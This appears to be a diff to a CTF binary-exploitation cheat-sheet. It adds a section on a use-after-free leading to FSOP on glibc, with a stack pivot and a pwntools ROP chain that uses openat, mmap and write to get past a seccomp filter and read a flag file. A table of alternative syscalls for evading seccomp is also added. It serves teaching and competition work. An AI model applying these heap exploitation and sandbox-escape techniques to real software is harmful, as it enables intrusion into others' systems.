@@ -30,6 +30,7 @@
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
 - [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
 - [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
+- [FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)](#fsop--seccomp-bypass-via-openatmmapwrite-ehax-2026)
 - [Kernel Exploitation](#kernel-exploitation)
 
 ---
@@ -606,6 +607,87 @@ for (uint64_t ctr = 0; ; ctr++) {
 **Flag via `/proc/self/fd/N`:**
 - If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
 - fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file
+
+## FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)
+
+**Pattern (The Revenge of Womp Womp):** Heap exploit (UAF) leading to FSOP chain, but seccomp blocks standard `open`/`read`/`write` or `execve`. Use alternative syscalls to read the flag.
+
+**Exploit chain:**
+1. **Leak libc** via `show()` on freed unsorted bin chunk (fd/bk pointers)
+2. **UAF → unsafe unlink** to redirect pointer to `.bss` region
+3. **Craft fake FILE** structure on heap with vtable pointing to `_IO_wfile_jumps`
+4. **FSOP chain:** `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)`
+5. **Stack pivot** via `mov rsp, rdx` gadget (rdx controllable from FILE struct)
+6. **ROP chain** using seccomp-compatible syscalls
+
+**Seccomp bypass with openat/mmap/write:**
+```python
+# When seccomp blocks open() and read(), use:
+# openat(AT_FDCWD, "/flag", O_RDONLY)  - syscall 257
+# mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0)  - syscall 9
+# write(STDOUT, mapped_addr, 4096)  - syscall 1
+
+from pwn import *
+
+rop = ROP(libc)
+# openat(AT_FDCWD=-100, "/flag", O_RDONLY=0)
+rop.raw(pop_rdi)
+rop.raw(-100 & 0xffffffffffffffff)  # AT_FDCWD
+rop.raw(pop_rsi)
+rop.raw(flag_str_addr)               # pointer to "/flag\x00"
+rop.raw(pop_rdx_rbx)
+rop.raw(0)                            # O_RDONLY
+rop.raw(0)
+rop.raw(libc.sym.openat)
+
+# mmap(NULL, 4096, PROT_READ=1, MAP_PRIVATE=2, fd=3, 0)
+rop.raw(pop_rdi)
+rop.raw(0)                            # addr = NULL
+rop.raw(pop_rsi)
+rop.raw(0x1000)                       # length
+rop.raw(pop_rdx_rbx)
+rop.raw(1)                            # PROT_READ
+rop.raw(0)
+# r10 = MAP_PRIVATE (2), r8 = fd (3) - need gadgets for these
+rop.raw(libc.sym.mmap)
+
+# write(1, mapped_addr, 4096)
+rop.raw(pop_rdi)
+rop.raw(1)                            # stdout
+rop.raw(pop_rsi)
+rop.raw(mapped_addr)                  # mmap return value
+rop.raw(pop_rdx_rbx)
+rop.raw(0x1000)
+rop.raw(0)
+rop.raw(libc.sym.write)
+```
+
+**`mov rsp, rdx` stack pivot gadget:**
+```python
+# Common in libc — search with:
+# ROPgadget --binary libc.so.6 | grep "mov rsp, rdx"
+# or: one_gadget libc.so.6 (sometimes lists pivot gadgets)
+
+# In FSOP context: rdx is controllable via _IO_wide_data fields
+# Set _wide_data->_IO_buf_base to point to your ROP chain
+# When _IO_WDOALLOCATE is called, rdx = _wide_data->_IO_buf_base
+# Pivot: mov rsp, rdx → ROP chain runs
+```
+
+**Key insight:** "Stale size tracking" = the menu tracks object sizes but doesn't invalidate after free. This enables UAF because `show()`/`edit()` still use the old size to access freed memory. Always check if delete nullifies the size field in addition to the pointer.
+
+**Seccomp alternative syscall quick reference:**
+| Blocked | Alternative | Syscall # |
+|---------|------------|-----------|
+| `open` | `openat` | 257 |
+| `open` | `openat2` | 437 |
+| `read` | `mmap` + access | 9 |
+| `read` | `pread64` | 17 |
+| `read` | `readv` | 19 |
+| `write` | `writev` | 20 |
+| `write` | `sendfile` | 40 |
+
+---
 
 ## Kernel Exploitation
 
